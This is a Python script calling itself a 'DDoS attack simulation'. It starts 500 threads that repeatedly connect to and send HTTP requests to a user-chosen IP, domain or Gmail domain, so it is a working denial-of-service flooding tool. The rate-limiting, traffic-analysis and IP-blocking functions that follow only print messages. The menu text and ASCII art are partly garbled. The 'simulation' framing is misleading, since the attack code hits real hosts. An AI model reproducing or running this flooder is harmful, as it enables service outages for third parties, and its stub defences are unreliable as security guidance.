import socket
import threading
import time
import sys
import os

# Function to print ASCII art
def print_ascii_art():
    ascii_art = """
 _______  _______  _______  _______  _______
(  ____ \(  ___  )(  ____ )(  ____ \ (  ___ )|\     /|
| (    \/| (   ) || (    )|| (    \/| (    )|| \   / |
| (__    | (___) || (____)|| (__    | (____)||  \_/  |
|  __)   |     __)|     __)|  __)   |     __)|   _   |
| (      | (\ (   | (\ (   | (      | (\ (   |  | |  |
| )      | ) \ \__| ) \ \__| (____/\| ) \ \__|  |_|  |
|/       |/   \__/|/   \__/(_______/|/   \__/(_) (_) ]
"""
    print(ascii_art)

# Function to perform the attack
def attack(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
            s.close()
        except Exception as e:
            print(f"Error in attack: {e}")
            break

# Function to start the attack with a specified number of threads
def start_attack(target_ip, target_port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip, target_port))
        thread.start()

# Hypothetical rate limiting implementation
def rate_limit(requests, limit):
    if requests > limit:
        print("Blocking excessive requests.")
        # Implement blocking logic here
    else:
        print("Requests within limit.")

# Hypothetical function to analyze traffic patterns
def analyze_traffic(traffic_data):
    syn_packets = traffic_data.count('SYN')
    if syn_packets > 1000:
        print("SYN flood attack detected.")
    else:
        print("Server recognition loading.")

# Hypothetical function to block malicious IP addresses
def block_ip(ip_address):
    print(f"Blocking IP address: {ip_address}")
    # Implement blocking logic here

# Function to simulate beep sound
def beep_sound():
    if os.name == 'nt':  # For Windows
        import winsound
        winsound.Beep(1000, 500)  # Beep at 1000 Hz for 500 ms
    else:  # For Unix-based systems
        print("\a")  # ASCII bell character

# Main function to simulate the story
def main():
    print("DDoS attack simulating IP processing")
    print_ascii_art()

    # Menu for user input
    print("Choose an option:")
    print("1. Custom IP")
    print("2. Custom Gmail")
    print("3. Server Domain")
    choice = input("Enter your choice (1/2/3): ")

    if choice == '1':
        target_ip = input("Enter the custom IP address: ")
        target_port = int(input("Enter the target port: "))
    elif choice == '2':
        gmail = input("Enter the custom Gmail address: ")
        domain = gmail.split('@')[-1]  # Extract the domain part of the email
        target_ip = socket.gethostbyname(domain)
        target_port = 80  # Default port for HTTP
    elif choice == '3':
        domain = input("Enter the server domain: ")
        target_ip = socket.gethostbyname(domain)
        target_port = 80  # Default port for HTTP
    else:
        print("Invalid choice. Exiting...")
        return

    # Simulate the attack
    print("Simulating DDoS attack...")
    start_attack(target_ip, target_port, 500)
    time.sleep(5)  # Let the attack run for a few seconds

    # Mitigation strategy
    print("\nMitigation: Implementing rate limiting...")
    requests = 1000
    limit = 500
    rate_limit(requests, limit)

    # Investigation and identification
    print("\nIf error exception advanced press slash for a signal")
    traffic_data = ['SYN', 'ACK', 'SYN', 'SYN', 'ACK', 'SYN'] * 500
    analyze_traffic(traffic_data)

    # Countermeasures
    print("\nCountermeasures: Blocking malicious software IP address...")
    malicious_ip = '192.168.1.1'
    block_ip(malicious_ip)

    print("\nIf error exception default press enter for a signal of code error.")
    input("Press Enter to send hack signal...")
    beep_sound()
    print("Hack signal sent!")

    # Keep the program running until '9' is pressed
    while True:
        exit_key = input("Press '9' to exit the program: ")
        if exit_key == '9':
            print("Exiting the program...")
            break

if __name__ == "__main__":
    main()
9
